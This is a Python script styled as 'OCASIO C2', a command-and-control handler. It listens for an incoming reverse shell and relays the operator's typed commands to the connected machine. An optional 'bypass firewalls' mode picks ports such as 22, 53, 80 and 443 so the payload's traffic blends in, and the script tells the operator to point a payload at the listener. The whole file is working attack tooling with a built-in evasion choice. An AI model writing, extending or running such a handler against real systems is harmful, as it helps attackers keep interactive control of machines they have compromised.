#!/usr/bin/env python3
import socket
import os
import threading
import sys
import random

def greet():
    print(r"""
  ___   ____    _    ____ ___ ___     ____ ____
 / _ \ / ___|  / \  / ___|_ _/ _ \   / ___|___ \
| | | | |     / _ \ \___ \| | | | | | |     __) |
| |_| | |___ / ___ \ ___) | | |_| | | |___ / __/
 \___/ \____/_/   \_\____/___\___/   \____|_____|

             WELCOME TO OCASIO C2
""")

def listener_info(use_input=True, stealth_override=None):
    lhost = "127.0.0.1"

    if use_input:
        stealth = input("Would you like to attempt to bypass firewalls? Y/N ")
        stealth = stealth.lower() == 'y'
    else:
        stealth = stealth_override if stealth_override is not None else False

    if stealth:
        def random_stealth_port():
            stealth_ports = [22, 53, 80, 443, 8080]
            return random.choice(stealth_ports)
        lport = random_stealth_port()
    else:
        excluded_ports = {22, 53, 80, 443, 8080}
        while True:
            lport = random.randint(1, 65535)
            if lport not in excluded_ports:
                break

    print(f"Ensure Payload redirects to {lhost}:{lport}")
    return lhost, lport

def handle_io(conn):
    def recv_from_shell():
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
        except Exception:
            pass

    def send_to_shell():
        try:
            while True:
                cmd = sys.stdin.readline()
                if not cmd:
                    break
                conn.sendall(cmd.encode())
        except Exception:
            pass

    recv_thread = threading.Thread(target=recv_from_shell, daemon=True)
    send_thread = threading.Thread(target=send_to_shell, daemon=True)

    recv_thread.start()
    send_thread.start()
    recv_thread.join()
    send_thread.join()

def listener(lhost, lport):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((lhost, lport))
        s.listen()
        print(f"[+] Listening on {lhost}:{lport} ...")

        conn, addr = s.accept()
        print(f"[+] Connection from {addr}\n")
        handle_io(conn)
        print("[-] Session closed.")

# Entry point
if __name__ == "__main__":
    greet()
    lhost, lport = listener_info()
    listener(lhost, lport)
